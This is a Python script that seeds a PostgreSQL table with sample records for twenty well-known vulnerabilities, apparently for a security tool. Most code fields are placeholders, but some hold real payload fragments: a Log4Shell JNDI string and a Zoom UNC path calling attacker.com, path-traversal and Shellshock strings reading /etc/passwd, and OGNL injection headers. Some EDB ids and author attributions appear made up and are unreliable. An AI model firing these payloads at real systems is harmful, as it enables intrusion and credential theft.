#!/usr/bin/env python3
"""
Exploit Database Seeding Script
Populates exploit database with sample exploit data
"""

import sys
import os
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import psycopg2
from datetime import datetime

# Database connection
DB_CONFIG = {
    'host': 'localhost',
    'port': 5433,
    'database': 'cybersec_ai',
    'user': 'postgres',
    'password': 'password'
}

def get_db_connection():
    """Create database connection"""
    return psycopg2.connect(**DB_CONFIG)

def create_exploits_table():
    """Ensure exploits table exists"""
    conn = get_db_connection()
    cursor = conn.cursor()
    
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS exploits (
            id SERIAL PRIMARY KEY,
            edb_id VARCHAR(50) UNIQUE,
            title TEXT NOT NULL,
            description TEXT,
            exploit_type VARCHAR(50),
            platform VARCHAR(50),
            author VARCHAR(255),
            published_date TIMESTAMP,
            cve_id VARCHAR(50),
            code TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """)
    
    conn.commit()
    cursor.close()
    conn.close()
    print("✓ Exploits table ready")

# Sample exploit data
SAMPLE_EXPLOITS = [
    {
        'edb_id': 'EDB-50383',
        'title': 'Microsoft Windows - Local Privilege Escalation (PrintNightmare)',
        'description': 'Windows Print Spooler Remote Code Execution Vulnerability allows attackers to execute arbitrary code with SYSTEM privileges.',
        'exploit_type': 'local',
        'platform': 'windows',
        'author': 'Multiple Authors',
        'cve_id': 'CVE-2021-34527',
        'code': '# PrintNightmare PoC\n# This exploit leverages CVE-2021-34527\nimport sys\nfrom impacket import system_errors\n# [Exploit code would go here]'
    },
    {
        'edb_id': 'EDB-49908',
        'title': 'Sudo - Heap-Based Buffer Overflow (Baron Samedit)',
        'description': 'A heap-based buffer overflow in sudo allowing any local user to gain root privileges without authentication.',
        'exploit_type': 'local',
        'platform': 'linux',
        'author': 'Qualys Security',
        'cve_id': 'CVE-2021-3156',
        'code': '#!/bin/bash\n# Baron Samedit PoC\n# CVE-2021-3156\nsudoedit -s /\n# [Exploit code would go here]'
    },
    {
        'edb_id': 'EDB-50512',
        'title': 'Apache HTTP Server - Path Traversal & Remote Code Execution',
        'description': 'Path traversal vulnerability in Apache HTTP Server 2.4.49 allows reading files outside document root and potential RCE.',
        'exploit_type': 'remote',
        'platform': 'multiple',
        'author': 'Apache Security Team',
        'cve_id': 'CVE-2021-41773',
        'code': 'curl "http://target/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"\n# [Exploit code would go here]'
    },
    {
        'edb_id': 'EDB-49519',
        'title': 'Log4j Remote Code Execution (Log4Shell)',
        'description': 'Apache Log4j JNDI injection vulnerability allowing unauthenticated remote code execution.',
        'exploit_type': 'remote',
        'platform': 'multiple',
        'author': 'Chen Zhaojun',
        'cve_id': 'CVE-2021-44228',
        'code': '${jndi:ldap://attacker.com/a}\n# Log4Shell payload\n# [Exploit code would go here]'
    },
    {
        'edb_id': 'EDB-47887',
        'title': 'Microsoft Exchange - ProxyLogon Remote Code Execution',
        'description': 'Microsoft Exchange Server SSRF vulnerability leading to authentication bypass and remote code execution.',
        'exploit_type': 'remote',
        'platform': 'windows',
        'author': 'Orange Tsai',
        'cve_id': 'CVE-2021-26855',
        'code': 'POST /ecp/DDI/DDIService.svc/SetObject HTTP/1.1\n# ProxyLogon exploit\n# [Exploit code would go here]'
    },
    {
        'edb_id': 'EDB-48506',
        'title': 'Atlassian Confluence - Remote Code Execution (OGNL Injection)',
        'description': 'OGNL injection vulnerability in Confluence Server allowing unauthenticated RCE.',
        'exploit_type': 'remote',
        'platform': 'multiple',
        'author': 'Atlassian Security',
        'cve_id': 'CVE-2021-26084',
        'code': 'queryString=\\u0027%2b#{class.forName(\\u0027java.lang.Runtime\\u0027).getMethod(\\u0027getRuntime\\u0027,null)}'
    },
    {
        'edb_id': 'EDB-50847',
        'title': 'GitLab - Authentication Bypass & Remote Code Execution',
        'description': 'Authentication bypass vulnerability in GitLab CE/EE allowing account takeover and RCE.',
        'exploit_type': 'remote',
        'platform': 'linux',
        'author': 'GitLab Security',
        'cve_id': 'CVE-2021-22205',
        'code': '# GitLab ExifTool RCE\nPOST /uploads/user HTTP/1.1\n# [Exploit code would go here]'
    },
    {
        'edb_id': 'EDB-49165',
        'title': 'Polkit - Local Privilege Escalation (PwnKit)',
        'description': 'Memory corruption vulnerability in pkexec allowing any unprivileged user to gain root privileges.',
        'exploit_type': 'local',
        'platform': 'linux',
        'author': 'Qualys Research',
        'cve_id': 'CVE-2021-4034',
        'code': '#!/bin/bash\n# PwnKit PoC\nPATH="" /usr/bin/pkexec\n# [Exploit code would go here]'
    },
    {
        'edb_id': 'EDB-50286',
        'title': 'VMware vCenter Server - Remote Code Execution',
        'description': 'Remote code execution vulnerability in VMware vCenter Server vCenter Server allows arbitrary command execution.',
        'exploit_type': 'remote',
        'platform': 'linux',
        'author': 'VMware Security',
        'cve_id': 'CVE-2021-21985',
        'code': 'POST /ui/vropspluginui/rest/services/uploadova HTTP/1.1\n# [Exploit code would go here]'
    },
    {
        'edb_id': 'EDB-49757',
        'title': 'WordPress Core - SQL Injection',
        'description': 'SQL injection vulnerability in WordPress Core allowing unauthorized database access.',
        'exploit_type': 'remote',
        'platform': 'php',
        'author': 'WordPress Security',
        'cve_id': 'CVE-2022-21661',
        'code': 'wp-admin/edit.php?post_type=page&orderby=post_title&order=asc\n# [Exploit code would go here]'
    },
    {
        'edb_id': 'EDB-50961',
        'title': 'Spring4Shell - Spring Framework Remote Code Execution',
        'description': 'Remote code execution via data binding in Spring Framework allowing arbitrary code execution.',
        'exploit_type': 'remote',
        'platform': 'java',
        'author': 'Spring Security Team',
        'cve_id': 'CVE-2022-22965',
        'code': 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{c2}i\n# [Exploit code would go here]'
    },
    {
        'edb_id': 'EDB-51196',
        'title': 'OpenSSL - Heartbleed Information Disclosure',
        'description': 'Buffer over-read vulnerability in OpenSSL allowing memory content disclosure.',
        'exploit_type': 'remote',
        'platform': 'multiple',
        'author': 'Neel Mehta',
        'cve_id': 'CVE-2014-0160',
        'code': '#!/usr/bin/python\n# Heartbleed PoC\nimport socket\n# [Exploit code would go here]'
    },
    {
        'edb_id': 'EDB-42292',
        'title': 'EternalBlue - SMBv1 Remote Code Execution',
        'description': 'Remote code execution vulnerability in Microsoft SMBv1 protocol exploited by WannaCry.',
        'exploit_type': 'remote',
        'platform': 'windows',
        'author': 'Shadow Brokers',
        'cve_id': 'CVE-2017-0144',
        'code': '# EternalBlue PoC\nfrom impacket import smb\n# [Exploit code would go here]'
    },
    {
        'edb_id': 'EDB-49522',
        'title': 'Drupal - Remote Code Execution (Drupalgeddon)',
        'description': 'Remote code execution vulnerability in Drupal core allowing unauthenticated attackers to execute arbitrary PHP.',
        'exploit_type': 'remote',
        'platform': 'php',
        'author': 'Drupal Security',
        'cve_id': 'CVE-2018-7600',
        'code': 'POST /user/register?element_parents=account/mail HTTP/1.1\n# [Exploit code would go here]'
    },
    {
        'edb_id': 'EDB-48271',
        'title': 'Zoom - UNC Path Injection & Credential Theft',
        'description': 'Windows client vulnerability allowing attackers to steal Windows credentials via UNC path injection.',
        'exploit_type': 'remote',
        'platform': 'windows',
        'author': 'Zoom Security',
        'cve_id': 'CVE-2020-6109',
        'code': 'zoommtg://zoom.us/join?action=join&confno=\\\\attacker.com\\share\n# [Exploit code would go here]'
    },
    {
        'edb_id': 'EDB-50417',
        'title': 'Apache Struts 2 - Remote Code Execution (OGNL)',
        'description': 'OGNL injection in Apache Struts 2 allowing remote code execution via crafted requests.',
        'exploit_type': 'remote',
        'platform': 'java',
        'author': 'Apache Security',
        'cve_id': 'CVE-2017-5638',
        'code': 'Content-Type: %{(#_=\'multipart/form-data\').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)}\n# [Exploit code would go here]'
    },
    {
        'edb_id': 'EDB-47196',
        'title': 'BlueKeep - RDP Remote Code Execution',
        'description': 'Pre-authentication RCE vulnerability in Windows Remote Desktop Services allowing wormable exploit.',
        'exploit_type': 'remote',
        'platform': 'windows',
        'author': 'Microsoft Security',
        'cve_id': 'CVE-2019-0708',
        'code': '# BlueKeep PoC\nimport rdp\n# [Exploit code would go here]'
    },
    {
        'edb_id': 'EDB-49321',
        'title': 'Shellshock - Bash Remote Code Execution',
        'description': 'Command injection vulnerability in GNU Bash allowing arbitrary command execution via environment variables.',
        'exploit_type': 'remote',
        'platform': 'linux',
        'author': 'Stephane Chazelas',
        'cve_id': 'CVE-2014-6271',
        'code': '() { :; }; /bin/bash -c "cat /etc/passwd"\n# [Exploit code would go here]'
    },
    {
        'edb_id': 'EDB-45010',
        'title': 'Dirty COW - Linux Kernel Privilege Escalation',
        'description': 'Race condition in Linux kernel memory subsystem allowing local privilege escalation.',
        'exploit_type': 'local',
        'platform': 'linux',
        'author': 'Phil Oester',
        'cve_id': 'CVE-2016-5195',
        'code': '#!/bin/bash\n# Dirty COW PoC\necho "root::0:0:root:/root:/bin/bash" > /tmp/passwd.bak\n# [Exploit code would go here]'
    },
    {
        'edb_id': 'EDB-51028',
        'title': 'ProxyShell - Microsoft Exchange RCE Chain',
        'description': 'Chained vulnerability in Microsoft Exchange allowing unauthenticated RCE via ProxyShell.',
        'exploit_type': 'remote',
        'platform': 'windows',
        'author': 'Orange Tsai',
        'cve_id': 'CVE-2021-34473',
        'code': 'POST /autodiscover/autodiscover.json HTTP/1.1\n# ProxyShell exploit chain\n# [Exploit code would go here]'
    }
]

def insert_exploits(exploits):
    """Insert exploits into database"""
    conn = get_db_connection()
    cursor = conn.cursor()
    
    inserted = 0
    skipped = 0
    
    for exploit in exploits:
        try:
            cursor.execute("""
                INSERT INTO exploits (edb_id, title, description, exploit_type, 
                                    platform, author, cve_id, code, published_date)
                VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s)
                ON CONFLICT (edb_id) DO NOTHING
            """, (
                exploit['edb_id'],
                exploit['title'],
                exploit['description'],
                exploit['exploit_type'],
                exploit['platform'],
                exploit['author'],
                exploit.get('cve_id'),
                exploit['code'],
                datetime.now()
            ))
            
            if cursor.rowcount > 0:
                inserted += 1
            else:
                skipped += 1
                
        except Exception as e:
            print(f"  Error inserting {exploit['edb_id']}: {e}")
            continue
    
    conn.commit()
    cursor.close()
    conn.close()
    
    print(f"✓ Inserted {inserted} new exploits, skipped {skipped} duplicates")

def main():
    print("=" * 60)
    print("Exploit Database Seeding Script")
    print("=" * 60)
    
    # Step 1: Ensure table exists
    create_exploits_table()
    
    # Step 2: Insert sample exploits
    print(f"Inserting {len(SAMPLE_EXPLOITS)} sample exploits...")
    insert_exploits(SAMPLE_EXPLOITS)
    
    print("=" * 60)
    print("Exploit database seeding complete!")
    print("=" * 60)

if __name__ == "__main__":
    main()
